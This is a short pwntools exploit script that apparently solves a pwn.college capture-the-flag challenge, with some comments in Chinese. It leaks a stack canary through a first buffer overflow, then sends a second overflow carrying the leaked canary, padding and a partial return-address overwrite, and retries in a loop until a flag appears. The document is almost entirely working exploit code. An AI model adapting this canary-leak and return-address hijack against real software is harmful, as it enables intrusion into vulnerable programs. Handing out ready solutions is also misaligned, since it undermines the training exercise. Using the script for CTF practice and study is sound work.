import sys
import itertools

from pwn import *

context.log_level = "error"

# recursive same canary
def exploit():
    p = process("/challenge/latent-leak-hard")

    try:
        # backdoor get Canary
        # canary 0x118
        # buf 0x170
        # buf to copy of canary 88
        # padding 88 + 1
        p.sendlineafter(b"Payload size:", b"89")

        # 构造 Payload 1: 'REPEAT' + padding + 1 byte 覆盖 Canary 的 \x00
        payload1 = b"REPEAT".ljust(88, b"A") + b"X"
        p.sendafter(b"bytes)!\n", payload1)

        p.recvuntil(b"You said: ")
        p.recv(89)  # offset payload
        leaked_canary = p.recv(7)
        canary = b"\x00" + leaked_canary

        # second challenge overflow
        p.sendlineafter(b"Payload size:", b"378")

        # 构造 Payload 2: Padding + 真实的 Canary +Dummy RBP + 2 Bytes RIP 覆盖
        payload2 = b"A" * 360 + canary + b"B" * 8 + b"\x3a\x18"
        p.sendafter(b"bytes)!\n", payload2)

        result = p.recvall(timeout=1)
        if b"flag{" in result or b"pwn.college{" in result:
            print("\n[+] Success!")
            print(result.decode())
            return True

    except Exception as e:
        pass
    finally:
        p.close()

    return False

if __name__ == "__main__":
    for attempts in itertools.count():
        sys.stdout.write(f"\rAttempt: {attempts}")
        sys.stdout.flush()
        if exploit():
            break

